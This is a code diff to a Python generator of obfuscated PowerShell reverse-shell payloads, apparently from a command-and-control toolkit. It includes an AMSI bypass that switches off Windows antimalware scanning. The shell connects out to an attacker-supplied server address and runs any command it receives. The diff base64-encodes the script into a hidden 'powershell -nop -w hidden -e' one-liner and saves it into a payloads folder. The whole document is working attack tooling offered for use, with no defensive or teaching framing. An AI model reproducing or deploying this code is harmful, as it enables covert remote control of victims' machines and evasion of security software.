@@ -26,44 +26,39 @@ def amsi_bypass_block(var):
         f"${var['amsi_field']} = ${{{var['amsi_type']}}}.GetField({field},'NonPublic,Static')\n"
         f"${var['amsi_field']}.SetValue($null,$true)\n"
     )
-def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
-    var = {k: rand_name() for k in ["tcpclient", "stream", "bytes", "i", "data", "sendback", "sendbyte"]}
-    
-    core_shell = (
-        f"${var['tcpclient']} = New-Object System.Net.Sockets.TCPClient('{host}',{port});\n"
-        f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream();\n"
-        f"${var['bytes']} = 0..65535|%{{0}};\n"
-        f"while((${{var['i']}}=${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
-        f"    ${{var['data']}}=(New-Object System.Text.ASCIIEncoding).GetString(${{{var['bytes']}}},0,${{{var['i']}}}).Trim();\n"
-        f"    if(${{var['data']}} -ne ''){{\n"
-        f"        try{{ $out=(iex ${{var['data']}} 2>&1|Out-String) }}catch{{ $out=$_ }};\n"
-        f"        $out+='PS '+(pwd).Path+'> ';\n"
-        f"        ${{var['sendbyte']}}=[System.Text.Encoding]::ASCII.GetBytes($out);\n"
-        f"        ${{{var['stream']}}}.Write(${{{var['sendbyte']}}},0,${{{var['sendbyte']}}}.Length);\n"
-        f"        ${{{var['stream']}}}.Flush();\n"
-        f"    }}\n"
-        f"}}\n"
-    )
-
-    core_shell_bytes = core_shell.encode('utf-8')
-    core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
-    loader_var = rand_name()
-    loader = (
-        f"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);\n"
-        f"${loader_var}='{core_shell_b64}';\n"
-        f"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${loader_var})));\n"
-    )
+def generate_obfuscated_ps(host="YOUR_SERVER_IP", port=1443, write_file=True):
+    core_shell = f"""
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
+$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{{0}};
+while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{
+    $cmd = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i).Trim();
+    try {{
+        $result = iex $cmd 2>&1 | Out-String;
+    }} catch {{
+        $result = $_.Exception.Message;
+    }}
+    $result += 'PS ' + (pwd).Path + '> ';
+    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($result);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}}
+"""
+    encoded_shell = base64.b64encode(core_shell.encode('utf-8')).decode()
+    final_payload = f"powershell -nop -w hidden -e {encoded_shell}"
 
     if write_file:
         folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
         os.makedirs(folder, exist_ok=True)
         filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
         path = os.path.join(folder, filename)
-        with open(path, 'w', encoding='utf-8') as f:
-            f.write(loader)
+        with open(path, 'w') as f:
+            f.write(final_payload)
         return filename
     else:
-        return loader
+        return final_payload
+
 
 # Alias for your other code
 generate_polymorphic_ps = generate_obfuscated_ps
